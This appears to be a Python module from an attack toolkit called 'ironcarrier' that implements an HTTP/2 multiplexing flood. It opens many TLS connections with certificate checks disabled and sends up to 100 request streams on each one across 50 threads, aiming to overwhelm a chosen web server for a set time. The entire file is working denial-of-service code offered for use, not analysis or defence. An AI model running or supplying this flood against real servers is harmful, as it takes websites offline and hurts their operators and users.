#!/usr/bin/env python3
"""
Hammer Vector
HTTP/2 multiplexing flood
"""

import socket
import ssl
import random
import time
import threading
import struct
import string
from typing import Optional
from ironcarrier.core.stats import StatsCollector


class Attack:
    """HTTP/2 multiplexing flood"""
    
    HTTP2_PREFACE = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
    
    SETTINGS_FRAME = struct.pack('>IcBBII', 0, b'\x04', 0, 0, 0, 0)
    
    def __init__(self, target: str, port: int, duration: int,
                 threads: int = 50, stop_event: Optional[threading.Event] = None,
                 stats: Optional[StatsCollector] = None, **kwargs):
        self.target = target
        self.port = port
        self.duration = duration
        self.threads = threads
        self.stop_event = stop_event or threading.Event()
        self.stats = stats or StatsCollector()
        
        self.path = kwargs.get('path', '/')
        self.timeout = kwargs.get('timeout', 10)
        self.streams_per_conn = kwargs.get('streams_per_conn', 100)
        self._stream_id = 1
        self._stream_lock = threading.Lock()
    
    def _next_stream_id(self) -> int:
        with self._stream_lock:
            sid = self._stream_id
            self._stream_id += 2
            return sid
    
    def _build_headers_frame(self, stream_id: int, path: str) -> bytes:
        """Build HTTP/2 HEADERS frame with HPACK-like encoding"""
        # Simplified HPACK - just use static table entries
        headers = [
            (0x82, b''),              # :method GET
            (0x86, b''),              # :scheme https
            (0x84, b''),              # :path /
            (0x41, self.target.encode()),  # :authority
        ]
        
        header_block = b''
        for idx, (code, value) in enumerate(headers):
            if idx == 2:  # :path
                header_block += bytes([0x84])  # Static index for /
            elif idx == 3:
                # Literal with indexing
                header_block += bytes([0x40]) + bytes([len(value)]) + value
            else:
                header_block += bytes([code])
        
        # Pad header block
        length = len(header_block)
        flags = 0x04 | 0x01  # END_HEADERS | END_STREAM
        frame = struct.pack('>IcBB', length, b'\x01', flags, 0)
        frame += struct.pack('>I', stream_id & 0x7FFFFFFF)
        frame += header_block
        
        return frame
    
    def _build_settings_ack(self) -> bytes:
        """Build SETTINGS ACK frame"""
        return struct.pack('>IcBB', 0, b'\x04', 0x01, 0) + struct.pack('>I', 0)
    
    def _build_goaway(self, last_stream: int) -> bytes:
        """Build GOAWAY frame"""
        error_code = 0
        payload = struct.pack('>II', 0, last_stream) + struct.pack('>I', error_code)
        length = len(payload)
        frame = struct.pack('>IcBB', length, b'\x07', 0, 0) + struct.pack('>I', 0)
        frame += payload
        return frame
    
    def _create_h2_connection(self) -> socket.socket:
        """Establish HTTP/2 connection"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        sock.connect((self.target, self.port))
        
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(['h2', 'http/1.1'])
        
        sock = ctx.wrap_socket(sock, server_hostname=self.target)
        
        # Check ALPN negotiation
        if sock.selected_alpn_protocol() != 'h2':
            raise ConnectionError("Server did not negotiate h2")
        
        # Send preface
        sock.sendall(self.HTTP2_PREFACE)
        sock.sendall(self.SETTINGS_FRAME)
        
        # Read server settings
        try:
            sock.recv(4096)
        except Exception:
            pass
        
        # Send SETTINGS ACK
        sock.sendall(self._build_settings_ack())
        
        return sock
    
    def _attack_thread(self) -> None:
        end_time = time.time() + self.duration
        
        while time.time() < end_time and not self.stop_event.is_set():
            sock = None
            try:
                sock = self._create_h2_connection()
                
                # Send multiple streams
                total_bytes = 0
                for _ in range(self.streams_per_conn):
                    if self.stop_event.is_set():
                        break
                    stream_id = self._next_stream_id()
                    frame = self._build_headers_frame(stream_id, self.path)
                    sock.sendall(frame)
                    total_bytes += len(frame)
                
                self.stats.add_packets(self.streams_per_conn, total_bytes + 24)
                self.stats.add_connection()
                
                # Drain response
                try:
                    sock.recv(65535)
                except Exception:
                    pass
                    
            except Exception:
                self.stats.add_error()
            finally:
                if sock:
                    try:
                        sock.close()
                    except Exception:
                        pass
    
    def run(self) -> None:
        threads = [threading.Thread(target=self._attack_thread, daemon=True) for _ in range(self.threads)]
        for t in threads: t.start()
        for t in threads: t.join(timeout=self.duration + 10)
